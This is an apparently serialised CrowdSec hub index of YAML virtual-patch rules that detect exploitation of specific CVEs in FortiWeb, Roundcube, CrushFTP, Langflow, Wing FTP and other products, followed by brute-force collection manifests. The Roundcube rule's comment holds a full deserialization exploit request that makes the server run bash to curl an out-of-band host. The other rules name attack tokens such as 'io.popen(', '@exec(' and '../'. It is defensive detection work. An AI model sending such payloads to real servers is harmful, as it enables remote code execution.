"name: crowdsecurity/vpatch-CVE-2025-25257\ndescription: \"Fortinet FortiWeb Fabric Connector - Pre-Authenticated SQL Injection (CVE-2025-25257)\"\n#https://labs.watchtowr.com/pre-auth-sql-injection-to-rce-fortinet-fortiweb-fabric-connector-cve-2025-25257/\nrules:\n  - and:\n      - zones:\n          - METHOD\n        match:\n          type: equals\n          value: GET\n      - zones:\n          - URI\n        transform:\n          - lowercase\n        match:\n          type: regex\n          value: /api/(fabric/device/status|v[0-9]/fabric/widget)\n      - zones:\n          - HEADERS\n        variables:\n          - Authorization\n        match:\n          type: contains\n          value: \"'\"\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Fortinet FortiWeb Fabric Connector - Pre-Authenticated SQL Injection\"\n  classification:\n    - cve.CVE-2025-25257\n    - attack.T1190\n    - cwe.CWE-89\n", "description": "Fortinet FortiWeb Fabric Connector - Pre-Authenticated SQL Injection (CVE-2025-25257)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2025-25257.yaml", "version": "0.1", "versions": {"0.1": {"digest": "3ae3ed2df954d0d9f91ab56198a5ea2d66826d7252a7520efca0def188cdd948"}}}, "crowdsecurity/vpatch-CVE-2025-28367": {"content": "## autogenerated on 2025-05-09 09:21:48\nname: crowdsecurity/vpatch-CVE-2025-28367\ndescription: 'Detects directory traversal in mojoPortal BetterImageGallery API Controller (CVE-2025-28367)'\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: /api/betterimagegallery/imagehandler\n      - zones:\n          - ARGS\n        variables:\n          - path\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: ../\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'MojoPortal - LFI'\n  classification:\n    - cve.CVE-2025-28367\n    - attack.T1006\n    - cwe.CWE-284\n", "description": "Detects directory traversal in mojoPortal BetterImageGallery API Controller (CVE-2025-28367)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2025-28367.yaml", "version": "0.1", "versions": {"0.1": {"digest": "8d07e71dd0bd62931d91898c15e38f799a8f4fb2fc6ca3c34ac564d881d659ea"}}}, "crowdsecurity/vpatch-CVE-2025-29306": {"content": "## autogenerated on 2025-06-04 14:10:56\nname: crowdsecurity/vpatch-CVE-2025-29306\ndescription: 'Detects FoxCMS v1.2.5 RCE via malicious id parameter in /images/index.html'\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: /images/index.html\n      - zones:\n          - ARGS\n        variables:\n          - id\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: '${'\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'FoxCMS - RCE'\n  classification:\n    - cve.CVE-2025-29306\n    - attack.T1190\n    - cwe.CWE-94\n", "description": "Detects FoxCMS v1.2.5 RCE via malicious id parameter in /images/index.html", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2025-29306.yaml", "version": "0.1", "versions": {"0.1": {"digest": "295cf1f27685162d083f2a91307690dea8ae3de9aa9c63b0e8876c1e6488aa71"}}}, "crowdsecurity/vpatch-CVE-2025-29927": {"content": "name: crowdsecurity/vpatch-CVE-2025-29927\ndescription: \"Next.js Middleware Bypass - (CVE-2025-29927)\"\nrules:\n  - and:\n      - zones:\n          - HEADERS_NAMES\n        transform:\n          - lowercase\n        match:\n          type: regex\n          value: \"x-middleware-(subrequest|rewrite|next|redirect)\"\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Next.js Middleware Bypass\"\n  classification:\n    - cve.CVE-2025-29927\n    - attack.T1595\n    - attack.T1190\n    - cwe.CWE-285\n", "description": "Next.js Middleware Bypass - (CVE-2025-29927)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2025-29927.yaml", "version": "0.2", "versions": {"0.1": {"digest": "854e8f3198f0efb84da0c48a62e8cbf433cee49445c0a53d143e03777bec4c26"}, "0.2": {"digest": "4640ceca498692e4992ec648937684afb0e9b47f6738ae9ea66a650ddea0cfe5"}}}, "crowdsecurity/vpatch-CVE-2025-31161": {"content": "## autogenerated on 2025-05-09 09:01:45\nname: crowdsecurity/vpatch-CVE-2025-31161\ndescription: 'Detects authentication bypass in CrushFTP via crafted Authorization header and specific endpoint access.'\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: /webinterface/function/\n      - zones:\n          - ARGS\n        variables:\n          - command\n        transform:\n          - lowercase\n        match:\n          type: equals\n          value: getuserlist\n      - zones:\n          - HEADERS\n        variables:\n          - authorization\n        transform:\n          - lowercase\n        match:\n          type: equals\n          value: aws4-hmac-sha256 credential=crushadmin/\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'CrushFTP - Authentication Bypass'\n  classification:\n    - cve.CVE-2025-31161\n    - attack.T1190\n    - cwe.CWE-287\n", "description": "Detects authentication bypass in CrushFTP via crafted Authorization header and specific endpoint access.", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2025-31161.yaml", "version": "0.1", "versions": {"0.1": {"digest": "2b1a72ba81a5adca2721f3e01eaf023c045a4ea8a32faa10ac9b890da7c7a3b6"}}}, "crowdsecurity/vpatch-CVE-2025-31324": {"content": "#added 2025-09-05\nname: crowdsecurity/vpatch-CVE-2025-31324\ndescription: \"SAP NetWeaver - File Upload (CVE-2025-31324)\"\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n        match:\n          type: equals\n          value: \"/developmentserver/metadatauploader\"\n      - zones:\n          - ARGS\n        variables:\n          - contenttype\n        transform:\n          - lowercase\n        match:\n          type: equals\n          value: \"model\"\n      - zones:\n          - FILENAMES\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: \".jsp\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"SAP NetWeaver - File Upload\"\n  classification:\n    - cve.CVE-2025-31324\n    - attack.T1595\n    - attack.T1190\n    - cwe.CWE-434\n", "description": "SAP NetWeaver - File Upload (CVE-2025-31324)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2025-31324.yaml", "version": "0.1", "versions": {"0.1": {"digest": "d50fe2ed1d49470903e95ac235d5ae83403cc8b161aba42b9126bc465890014b"}}}, "crowdsecurity/vpatch-CVE-2025-3248": {"content": "## autogenerated on 2025-05-09 09:22:59\nname: crowdsecurity/vpatch-CVE-2025-3248\ndescription: 'Detects unauthenticated remote code execution in Langflow via /api/v1/validate/code endpoint.'\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: /api/v1/validate/code\n      - zones:\n          - BODY_ARGS\n        variables:\n          - json.code\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: \"@exec(\"\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'Langflow - RCE'\n  classification:\n    - cve.CVE-2025-3248\n    - attack.T1190\n    - cwe.CWE-306\n", "description": "Detects unauthenticated remote code execution in Langflow via /api/v1/validate/code endpoint.", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2025-3248.yaml", "version": "0.1", "versions": {"0.1": {"digest": "bdce0c9a4a949290ccf5a1b94b446b76129ccf8b3a63c39bc9fb1c2cc410ce26"}}}, "crowdsecurity/vpatch-CVE-2025-3605": {"content": "## autogenerated on 2025-09-24 14:46:43\nname: crowdsecurity/vpatch-CVE-2025-3605\ndescription: 'Detects privilege escalation in WordPress Frontend Login and Registration Blocks plugin via unauthorized email update.'\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: /wp-admin/admin-ajax.php\n      - zones:\n          - BODY_ARGS\n        variables:\n          - action\n        transform:\n          - lowercase\n        match:\n          type: equals\n          value: flrblocksusersettingsupdatehandle\n      - zones:\n          - BODY_ARGS_NAMES\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: flr-blocks-email-update\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'WordPress Frontend Login And Registration Blocks - Privilege Escalation'\n  classification:\n    - cve.CVE-2025-3605\n    - attack.T1068\n    - cwe.CWE-639\n", "description": "Detects privilege escalation in WordPress Frontend Login and Registration Blocks plugin via unauthorized email update.", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2025-3605.yaml", "version": "0.1", "versions": {"0.1": {"digest": "84a8bc594a816a04e152bdfcd803f19cec8e6a2629e457c8d8939e533f523124"}}}, "crowdsecurity/vpatch-CVE-2025-36604": {"content": "## autogenerated on 2025-10-09 10:57:26\nname: crowdsecurity/vpatch-CVE-2025-36604\ndescription: 'Detects OS command injection in Dell UnityVSA via crafted path in /misc/ endpoint (CVE-2025-36604)'\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: /misc/\n      - zones:\n          - URI\n        transform:\n          - urldecode\n        match:\n          type: regex\n          value: '[`|;$]'\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'Dell UnityVSA - RCE'\n  classification:\n    - cve.CVE-2025-36604\n    - attack.T1190\n    - cwe.CWE-78\n", "description": "Detects OS command injection in Dell UnityVSA via crafted path in /misc/ endpoint (CVE-2025-36604)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2025-36604.yaml", "version": "0.1", "versions": {"0.1": {"digest": "5d374a4b6e5efd99828802eb0da08b20cf1bf904f3876184c6538b8d25542d38"}}}, "crowdsecurity/vpatch-CVE-2025-47812": {"content": "## autogenerated on 2025-08-06 13:53:06\nname: crowdsecurity/vpatch-CVE-2025-47812\ndescription: 'Detects Wing FTP Server <= 7.4.3 RCE via Lua code injection in username parameter during login.'\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: /loginok.html\n      - zones:\n          - BODY_ARGS\n        variables:\n          - username\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: ']]'\n      - zones:\n          - BODY_ARGS\n        variables:\n          - username\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: 'io.popen('\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'Wing FTP Server - RCE'\n  classification:\n    - cve.CVE-2025-47812\n    - attack.T1190\n    - cwe.CWE-94\n", "description": "Detects Wing FTP Server <= 7.4.3 RCE via Lua code injection in username parameter during login.", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2025-47812.yaml", "version": "0.1", "versions": {"0.1": {"digest": "0714225c75f112b3ee1bf319a2bb7c0f09b0bf1dc4e29745fc7431a5c78c539f"}}}, "crowdsecurity/vpatch-CVE-2025-49113": {"content": "name: crowdsecurity/vpatch-CVE-2025-49113\ndescription: 'Detects arbitrary remote code execution vulnerability via PHP Object Deserialization in Roundcube'\n#POST /?_task=settings&_framed=1&_remote=1&_from=!\";O:16:\"Crypt_GPG_Engine\":1:{s:8:\"_gpgconf\";s:{{44 + len(oast_new)}}:\"bash+-c+\"printf+'curl+{{oast_new}}'>/tmp/p;bash+/tmp/p\";\";}}&_action=upload \nrules:\n  - and:\n      - zones:\n          - METHOD\n        match:\n          type: equals\n          value: POST\n      - zones:\n          - ARGS\n        variables:\n          - _task\n        transform:\n          - urldecode\n          - lowercase\n        match:\n          type: equals\n          value: 'settings'\n      - zones:\n          - ARGS\n        variables:\n          - _action\n        transform:\n          - urldecode\n          - lowercase\n        match:\n          type: equals\n          value: 'upload'\n      - zones:\n          - ARGS\n        variables:\n          - _from\n        transform:\n          - urldecode\n          - lowercase\n        match:\n          type: regex\n          value: \"[^\\\\w.-]\"\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'Roundcube - RCE via PHP Object Deserialization'\n  classification:\n    - cve.CVE-2025-49113\n    - attack.T1190\n    - cwe.CWE-502", "description": "Detects arbitrary remote code execution vulnerability via PHP Object Deserialization in Roundcube", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2025-49113.yaml", "version": "0.1", "versions": {"0.1": {"digest": "7938a0e894c456c20ea4ba4bf42e9b3b98a9608fb805211b0b560653fb015d5b"}}}, "crowdsecurity/vpatch-CVE-2025-49132": {"content": "## autogenerated on 2025-08-06 13:53:30\nname: crowdsecurity/vpatch-CVE-2025-49132\ndescription: 'Detects unauthenticated remote code execution in Pterodactyl Panel via path traversal in /locales/locale.json'\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: /locales/locale.json\n      - zones:\n          - ARGS\n        variables:\n          - locale\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: '../'\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'Pterodactyl Panel - RCE'\n  classification:\n    - cve.CVE-2025-49132\n    - attack.T1190\n    - cwe.CWE-20\n", "description": "Detects unauthenticated remote code execution in Pterodactyl Panel via path traversal in /locales/locale.json", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2025-49132.yaml", "version": "0.1", "versions": {"0.1": {"digest": "73ab47f43ae03cce51c6b2eb271c005b540739599f3897fc100c77a8d4f8658a"}}}, "crowdsecurity/vpatch-CVE-2025-52488": {"content": "## autogenerated on 2025-07-16 16:18:10\nname: crowdsecurity/vpatch-CVE-2025-52488\ndescription: \"Detects Unicode path normalization NTLM hash disclosure in DNN (DotNetNuke) via crafted file upload filename.\"\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: /providers/htmleditorproviders/dnnconnect.cke/browser/fileuploader.ashx\n      - zones:\n          - FILENAMES\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: \"%ef%bc%bc%ef%bc%bc\"\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"DNN DotNetNuke - NTLM Hash Disclosure\"\n  classification:\n    - cve.CVE-2025-52488\n    - attack.T1557\n    - cwe.CWE-200\n", "description": "Detects Unicode path normalization NTLM hash disclosure in DNN (DotNetNuke) via crafted file upload filename.", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2025-52488.yaml", "version": "0.2", "versions": {"0.1": {"digest": "941e76621e85e583ac052e9bfcf7fe59e03d42ee70849d630a86d34d07c5755b"}, "0.2": {"digest": "fbfcfabc33428e18d4d5a59ad0d4a7590bf75eaa5a4f160417bd24e71d44e2fa"}}}, "crowdsecurity/vpatch-CVE-2025-57819": {"content": "## autogenerated on 2025-09-19 09:07:38\nname: crowdsecurity/vpatch-CVE-2025-57819\ndescription: 'Detects unauthenticated SQL injection and RCE in FreePBX via vulnerable brand parameter in ajax.php endpoint.'\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: /admin/ajax.php\n      - zones:\n          - ARGS\n        variables:\n          - module\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: \"freepbx\\\\modules\\\\endpoint\\\\ajax\"\n      - zones:\n          - ARGS\n        variables:\n          - brand\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: \"'\"\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'FreePBX - RCE'\n  classification:\n    - cve.CVE-2025-57819\n    - attack.T1190\n    - cwe.CWE-89\n", "description": "Detects unauthenticated SQL injection and RCE in FreePBX via vulnerable brand parameter in ajax.php endpoint.", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2025-57819.yaml", "version": "0.1", "versions": {"0.1": {"digest": "7f5a67d28d47e36538f54883fd4eb789f1e25483cd884522e9c489961c4af507"}}}, "crowdsecurity/vpatch-CVE-2025-61882": {"content": "## autogenerated on 2025-10-09 07:53:02\nname: crowdsecurity/vpatch-CVE-2025-61882\ndescription: 'Detects Oracle E-Business Suite 12.2.3\u201312.2.14 LFI and SSRF/RCE via ieshostedsurvey.jsp and UiServlet endpoints.'\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: /oa_html/help/../ieshostedsurvey.jsp\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: /oa_html/configurator/uiservlet\n      - zones:\n          - BODY_ARGS\n        variables:\n          - getuitype\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: 'ieshostedsurvey.jsp'\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'Oracle E-Business Suite - RCE'\n  classification:\n    - cve.CVE-2025-61882\n    - attack.T1190\n    - cwe.CWE-94\n", "description": "Detects Oracle E-Business Suite 12.2.3\u201312.2.14 LFI and SSRF/RCE via ieshostedsurvey.jsp and UiServlet endpoints.", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2025-61882.yaml", "version": "0.1", "versions": {"0.1": {"digest": "5d40e54debd2cdc9e08531fe3ffea486ee509e423151e6d7cb1e150094bdd255"}}}, "crowdsecurity/vpatch-connectwise-auth-bypass": {"content": "name: crowdsecurity/vpatch-connectwise-auth-bypass\ndescription: \"Detect exploitation of auth bypass in ConnectWise ScreenConnect\"\nrules:\n  - zones:\n    - URI\n    transform:\n    - lowercase\n    match:\n      type: endsWith\n      value: /setupwizard.aspx/\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"ConnectWise ScreenConnect - Auth Bypass\"\n  classification:\n   - attack.T1595\n   - attack.T1190\n   - cve.CVE-2024-1709\n", "description": "Detect exploitation of auth bypass in ConnectWise ScreenConnect", "path": "appsec-rules/crowdsecurity/vpatch-connectwise-auth-bypass.yaml", "version": "0.3", "versions": {"0.1": {"digest": "3a461c52bf1c676beadeeef321bcd39a871b4051f1e5aca42fe2268b7f917dcd"}, "0.2": {"digest": "a7c50e04363300961065df8065b2fa7b038e07aa4f81b98b64484f2b567d982d"}, "0.3": {"digest": "70f819f47b0c12d5bafc64b3f7274b8e61dca3b22a35c23e21119d871dce2f61"}}}, "crowdsecurity/vpatch-env-access": {"content": "name: crowdsecurity/vpatch-env-access\ndescription: \"Detect access to .env files\"\nrules:\n  - zones:\n    - URI\n    transform:\n    - lowercase\n    match:\n      type: endsWith\n      value: .env\nlabels:\n  type: scan\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:scan\"\n  label: \"Access to .env file\"\n  classification:\n   - attack.T1595\n   - attack.T1190\n", "description": "Detect access to .env files", "path": "appsec-rules/crowdsecurity/vpatch-env-access.yaml", "version": "0.2", "versions": {"0.1": {"digest": "ae22c494fb05801bc4886564e63927ccc248be20b1d1dc31f1011a27a4d75cbe"}, "0.2": {"digest": "821917dc21f3b7bf1e5cacfbb33eb8d0213116e3808324763f78fe930bd59c12"}}}, "crowdsecurity/vpatch-git-config": {"content": "name: crowdsecurity/vpatch-git-config\ndescription: \"Detect access to .git files\"\nrules:\n  - zones:\n      - URI\n    transform:\n      - lowercase\n    match:\n      type: regex\n      value: '/\\.git/(config|head|index|refs|hooks|)$|/\\.svn/(wc\\.db|entries|format|)$|/\\.hg/(hgrc|)$'\nlabels:\n  type: scan\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:scan\"\n  label: \"Access to .git file\"\n  classification:\n    - attack.T1595\n", "description": "Detect access to .git files", "path": "appsec-rules/crowdsecurity/vpatch-git-config.yaml", "version": "0.4", "versions": {"0.1": {"digest": "cf59d1a407e0352662db0c66681d256c0e363560d93109f03ecdee994b04a542"}, "0.2": {"digest": "c1f8230f65f1cb5d1afe8e6ef164ce750ac8056db655d2096ca5dfeffdaa421c"}, "0.3": {"digest": "0a76dec74695599c0977bdd907896eee94a330b1f291372ad3f4635079d6df3d"}, "0.4": {"digest": "6f33a6a3112693bb1aff27b360e273a65e33bde96f601baaaf5aafbc26a09299"}}}, "crowdsecurity/vpatch-laravel-debug-mode": {"content": "name: crowdsecurity/vpatch-laravel-debug-mode\ndescription: \"Detect bots exploiting laravel debug mode\"\n#see https://github.com/s1miii/cape/blob/main/ler.py : bot is trying to trigger a debug log to extract secrets.\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: POST\n    - zones:\n        - BODY_ARGS_NAMES\n      transform:\n        - lowercase\n      match:\n        type: equals\n        value: \"0x[]\"\nlabels:\n  type: scan\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:scan\"\n  label: \"Access to laravel debug mode\"\n  #while the vpatch doesn't address directly the CVEs below, it detects the bot that abuses them.\n  classification:\n   - attack.T1595\n   - attack.T1190\n   - cve.CVE-2017-16894\n   - cve.CVE-2021-41714\n   - cve.CVE-2019-17050\n", "description": "Detect bots exploiting laravel debug mode", "path": "appsec-rules/crowdsecurity/vpatch-laravel-debug-mode.yaml", "version": "0.3", "versions": {"0.1": {"digest": "096552a04dd5f6c94e6beeadb8c197bc543518388b2b2316ce602b60ba3d9f49"}, "0.2": {"digest": "38bac09d834161aa1f0e66dbf6930c53a8f71c25871cb1e527c97c02b3a41b50"}, "0.3": {"digest": "209bf1b8311c071da33bf6ad7a2bd4b074c0ec1dcd2e28030d95cd4cd5fc1711"}}}, "crowdsecurity/vpatch-symfony-profiler": {"content": "name: crowdsecurity/vpatch-symfony-profiler\ndescription: \"Detect abuse of symfony profiler\"\nrules:\n  - zones:\n    - URI\n    transform:\n    - lowercase\n    match:\n      type: contains\n      value: /_profiler/phpinfo\n  - zones:\n    - URI\n    transform:\n    - lowercase\n    match:\n      type: contains\n      value: /_profiler/open\nlabels:\n  type: scan\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:scan\"\n  label: \"Access to symfony profiler\"\n  classification:\n   - attack.T1595\n   - attack.T1190\n", "description": "Detect abuse of symfony profiler", "path": "appsec-rules/crowdsecurity/vpatch-symfony-profiler.yaml", "version": "0.1", "versions": {"0.1": {"digest": "9f9f2298f065610b0b45115147050747dfb53eb51d8bda781811bdce3f5bef10"}}}}, "collections": {"Dominic-Wagner/vaultwarden": {"content": "parsers:\n  - Dominic-Wagner/vaultwarden-logs\nscenarios:\n  - Dominic-Wagner/vaultwarden-bf\ndescription: \"Vaultwarden support : parser and brute-force detection\"\nauthor: Dominic-Wagner\ntags:\n  - linux\n  - brute-force\n  - vaultwarden\n", "description": "Vaultwarden support : parser and brute-force detection", "parsers": ["Dominic-Wagner/vaultwarden-logs"], "path": "collections/Dominic-Wagner/vaultwarden.yml", "scenarios": ["Dominic-Wagner/vaultwarden-bf"], "version": "0.1", "versions": {"0.1": {"digest": "41f537b7985ef168a1d31c7cb10a49672925313724d523fba8389714c4222742"}}}, "Jgigantino31/ntfy": {"content": "parsers:\n  - Jgigantino31/ntfy-logs\nscenarios:\n  - Jgigantino31/ntfy-bf\ndescription: \"Ntfy Support : parser and brute-force detection\"\nauthor: Jgigantino31\ntags:\n  - linux\n  - brute-force\n  - ntfy\n", "description": "Ntfy Support : parser and brute-force detection", "parsers": ["Jgigantino31/ntfy-logs"], "path": "collections/Jgigantino31/ntfy.yaml", "scenarios": ["Jgigantino31/ntfy-bf"], "version": "0.1", "versions": {"0.1": {"digest": "7920744c493c0899b73a6a3bbdbc3731f46d90c2361f16bc8b4182a24753069f"}}}, "LePresidente/adguardhome": {"content": "parsers:\n  - LePresidente/adguardhome-logs\nscenarios:\n  - LePresidente/adguardhome-bf\ndescription: \"AdGuardHome Support : parser and brute-force detection\"\nauthor: LePresidente\ntags:\n  - linux\n  - brute-force\n  - AdGuardHome", "description": "AdGuardHome Support : parser and brute-force detection", "parsers": ["LePresidente/adguardhome-logs"], "path": "collections/LePresidente/adguardhome.yml", "scenarios": ["LePresidente/adguardhome-bf"], "version": "0.1", "versions": {"0.1": {"digest": "3ab656c2d2be80019f8b6c63a5ea46d7400593cb50c946cde89b05d1878229e5"}}}, "LePresidente/authelia": {"content": "parsers:\n  - LePresidente/authelia-logs\nscenarios:\n  - LePresidente/authelia-bf\ndescription: \"Authelia Support : parser and brute-force detection\"\nauthor: LePresidente\ntags:\n  - linux\n  - brute-force\n  - authelia", "description": "Authelia Support : parser and brute-force detection", "parsers": ["LePresidente/authelia-logs"], "path": "collections/LePresidente/authelia.yml", "scenarios": ["LePresidente/authelia-bf"], "version": "0.2", "versions": {"0.1": {"digest": "483d6a415e6649614ce28efbc2f87cf35664d989469e97cbd1f4d8b8ab7916ed"}, "0.2": {"digest": "24800ff1ae7b37bf343bc7dfc9053c0130e75c832826782fa422b182b787e0d5"}}}, "LePresidente/emby": {"content": "parsers:\n  - LePresidente/emby-logs\nscenarios:\n  - LePresidente/emby-bf\ndescription: \"Emby support : parser and brute-force detection\"\nauthor: LePresidente\ntags:\n  - linux\n  - brute-force\n  - emby", "description": "Emby support : parser and brute-force detection", "parsers": ["LePresidente/emby-logs"], "path": "collections/LePresidente/emby.yml", "scenarios": ["LePresidente/emby-bf"], "version": "0.1", "versions": {"0.1": {"digest": "53801da28b3557ad39bc8672d0db62d845cc401bbfcde36f6f4b7f0d8a749fe9"}}}, "LePresidente/gitea": {"content": "parsers:\n  - LePresidente/gitea-logs\nscenarios:\n  - LePresidente/gitea-bf\ndescription: \"Gitea Support : parser and brute-force detection\"\nauthor: LePresidente\ntags:\n  - linux\n  - brute-force\n  - gitea", "description": "Gitea Support : parser and brute-force detection", "parsers": ["LePresidente/gitea-logs"], "path": "collections/LePresidente/gitea.yml", "scenarios": ["LePresidente/gitea-bf"], "version": "0.2", "versions": {"0.1": {"digest": "1282681d69e45e64050a497ac8f17bfb67ba55a0c494743e3f5b33c2f3cee97d"}, "0.2": {"digest": "f5098f91736d1c3b835dfb741c271cad33a21ffb78e0554357950313ecdfe037"}}}, "LePresidente/grafana": {"content": "parsers:\n  - LePresidente/grafana-logs\nscenarios:\n  - LePresidente/grafana-bf\ndescription: \"Grafana Support : parser and brute-force detection\"\nauthor: LePresidente\ntags:\n  - linux\n  - brute-force\n  - grafana", "description": "Grafana Support : parser and brute-force detection", "parsers": ["LePresidente/grafana-logs"], "path": "collections/LePresidente/grafana.yml", "scenarios": ["LePresidente/grafana-bf"], "version": "0.1", "versions": {"0.1": {"digest": "ab0e0fd9a6a3b424af7ef5c162ae1d99e3adf0d5f166c0179acf57b8b3428ff0"}}}, "LePresidente/harbor": {"content": "parsers:\n  - LePresidente/harbor-logs\nscenarios:\n  - LePresidente/harbor-bf\ndescription: \"Harbor Support : parser and brute-force detection\"\nauthor: LePresidente\ntags:\n  - linux\n  - brute-force\n  - harbor", "description": "Harbor Support : parser and brute-force detection", "parsers": ["LePresidente/harbor-logs"], "path": "collections/LePresidente/harbor.yml", "scenarios": ["LePresidente/harbor-bf"], "version": "0.1", "versions": {"0.1": {"digest": "93d1b83b4948e89c35e034037be9588309a097009cf00335e054c8314424ff24"}}}, "LePresidente/jellyfin": {"content": "parsers:\n  - LePresidente/jellyfin-logs\n  - crowdsecurity/jellyfin-whitelist\nscenarios:\n  - LePresidente/jellyfin-bf\ndescription: \"Jellyfin support : parser and brute-force detection\"\nauthor: LePresidente\ntags:\n  - linux\n  - brute-force\n  - jellyfin\n", "description": "Jellyfin support : parser and brute-force detection", "parsers": ["LePresidente/jellyfin-logs", "crowdsecurity/jellyfin-whitelist"], "path": "collections/LePresidente/jellyfin.yml", "scenarios": ["LePresidente/jellyfin-bf"], "version": "0.2", "versions": {"0.1": {"digest": "4aba23304b8de2d269e4223a64e418b23154461af1862ef6b67239033e1bef43"}, "0.2": {"digest": "fe7f6fd1f6dde5ca66020b1d8431784a27dbb9ff34bbd15f4222356eb713a80f"}}}, "LePresidente/jellyseerr": {"content": "parsers:\n  - LePresidente/jellyseerr-logs\n  - crowdsecurity/jellyseerr-whitelist\nscenarios:\n  - LePresidente/jellyseerr-bf\ndescription: \"jellyseerr Support : parser and brute-force detection\"\nauthor: LePresidente\ntags:\n  - linux\n  - brute-force\n  - jellyseerr\n", "description": "jellyseerr Support : parser and brute-force detection", "parsers": ["LePresidente/jellyseerr-logs", "crowdsecurity/jellyseerr-whitelist"], "path": "collections/LePresidente/jellyseerr.yml", "scenarios": ["LePresidente/jellyseerr-bf"], "version": "0.2", "versions": {"0.1": {"digest": "aca16e29cb6b48379195cc5a945d40ec50839728ad57bfeaca2002cb74c4e942"}, "0.2": {"digest": "91722defe14fe2a6ef2c0f8ae22b2c7852aaeff5c3ef92d523399b917839ce09"}}}, "LePresidente/ombi": {"content": "parsers:\n  - LePresidente/ombi-logs\nscenarios:\n  - LePresidente/ombi-bf\ndescription: \"Ombi Support : parser and brute-force detection\"\nauthor: LePresidente\ntags:\n  - linux\n  - brute-force\n  - ombi", "description": "Ombi Support : parser and brute-force detection", "parsers": ["LePresidente/ombi-logs"], "path": "collections/LePresidente/ombi.yml", "scenarios": ["LePresidente/ombi-bf"], "version": "0.2", "versions": {"0.1": {"digest": "e9d9d297381904e0a1cc418bc8474969bca3f37acde631e7ed84529bd7e7f1f4"}, 